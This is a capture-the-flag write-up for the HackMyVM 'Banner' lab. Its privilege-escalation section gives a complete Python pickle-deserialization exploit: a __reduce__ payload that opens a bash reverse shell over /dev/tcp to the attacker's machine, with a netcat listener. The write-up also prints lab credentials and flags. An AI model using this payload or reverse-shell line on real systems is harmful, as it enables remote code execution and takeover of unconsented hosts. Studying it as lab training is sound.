# Banner — HackMyVM Writeup

**Difficulty:** Easy  
**OS:** Linux (Debian)  
**Author:** shalopai

---

## Reconnaissance

```bash
nmap -sV -sC -p- -T4 --min-rate 5000 172.20.10.3
```

Open ports:
- `21/tcp` — vsftpd 2.0.8
- `22/tcp` — OpenSSH 8.4p1 Debian
- `8080/tcp` — Werkzeug/Flask (Python 3.9.2)

---

## FTP Banner Enumeration

Connecting to FTP reveals a banner with an ASCII elephant and a rotating first line:

```
220-Wild               Elephants               Love
220-Clever             Owls                    Make
220-Elephants          :                       Mice
220-Amazing            Zebras                  Eat
220-Snakes             Eat                    Crickets
```

The hint at the bottom reads: `Carefully observe the changes in the information above.`

The trick: connect 5 times (60-second intervals) and take the **first letter of each word** from the first line, building an acrostic:

| Iteration | Line | Letters |
|---|---|---|
| 1 | Wild Elephants Love | WEL |
| 2 | Clever Owls Make | COM |
| 3 | Elephants : Mice | E:M (`:` acts as separator) |
| 4 | Amazing Zebras Eat | AZE |
| 5 | Snakes Eat Crickets | SEC |

Result: `WELCOME:MAZESEC`

---

## Initial Access

```bash
ssh welcome@172.20.10.3
# password: MAZESEC
```

```
welcome@Banner:~$ cat user.txt
flag{user-509fe78ad30da7792f576cd3a91a57fc}
```

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
# (root) NOPASSWD: /sbin/service sshd restart

ps aux | grep python
# root  454  /usr/bin/python3 /opt/ctf-game/main.py
```

A Flask application is running as **root** on port 8080.

### Source Code Analysis

`/opt/ctf-game/main.py` exposes the `/api/serialize` endpoint:

```python
@app.route('/api/serialize', methods=['POST'])
def serialize_score():
    data = request.get_data()
    obj = pickle.loads(base64.b64decode(data))  # vulnerable!
```

No validation whatsoever — `pickle.loads()` executes arbitrary code during deserialization.

### Exploit

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Create `exploit.py`:

```python
import pickle, base64, os, requests

class RCE(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/172.20.10.4/4444 0>&1"',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()

r = requests.post(
    'http://172.20.10.3:8080/api/serialize',
    data=payload,
    headers={'Content-Type': 'application/octet-stream'}
)
```

```bash
python3 exploit.py
```

Reverse shell connects back as **root**:

```
root@Banner:/opt/ctf-game# cat /root/root.txt
flag{root-fc7fb423367bb7fccb411758f06f857a}
```

---

## Flags

| Flag | Value |
|---|---|
| User | `flag{user-509fe78ad30da7792f576cd3a91a57fc}` |
| Root | `flag{root-fc7fb423367bb7fccb411758f06f857a}` |

---

## Summary

| Step | Technique |
|---|---|
| Enumeration | FTP banner acrostic (5 connections × first letter of each word) |
| Initial Access | SSH with credentials extracted from banner `welcome:MAZESEC` |
| PrivEsc | Pickle deserialization RCE via root-owned Flask application |